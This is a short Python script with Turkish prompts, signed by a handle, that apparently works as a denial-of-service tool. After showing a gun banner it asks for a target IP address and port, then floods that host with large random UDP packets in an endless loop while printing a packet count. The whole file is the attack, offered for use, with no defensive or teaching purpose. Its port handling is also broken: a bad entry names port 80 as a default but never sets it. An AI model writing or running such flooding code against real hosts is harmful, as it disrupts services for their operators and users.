import os
import random
import socket
import colorama
from colorama import Fore, Back, Style
colorama.init()

# Coded BY H04x
# Daha Kod yazmayı Bilmeyen Çakallara Gelsin XD

banner ="""

     _  __)\____________________________________/7_
    (//   )))))                                   `\||
     /   (((((        Coded BY H04x                 )`
    (______________________________________________/
     \   ________ ______________________________/
      ) /#######/ )\  /     )/
     / /##(\)##/ /  \(     //
    / /#######( (\______.ad`
   / /#########) )------``
  / /#########/ /
 / /###(/)###/ /
( (#########/ (
 \____/_______\)



"""
# Coded BY H04x
# Daha Kod yazmayı Bilmeyen Çakallara Gelsin XD
print(Fore.GREEN)
print(banner)

print(Fore.BLUE)
target_ip = str(input("Ip Adresi Girin: \n > "))
print(" ")
try:
    target_port = int(input("Port Girin: \n > "))
except ValueError:
    print("Geçersiz Port! (80)")

bytes = random._urandom(60000)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packega = 0


print(Fore.CYAN)
while True:
    sock.sendto(bytes, (target_ip, target_port))
    packega = packega+1
    print("Paket Yollanıyor  %s" %(packega))

# Coded BY H04x
# Daha Kod yazmayı Bilmeyen Çakallara Gelsin XD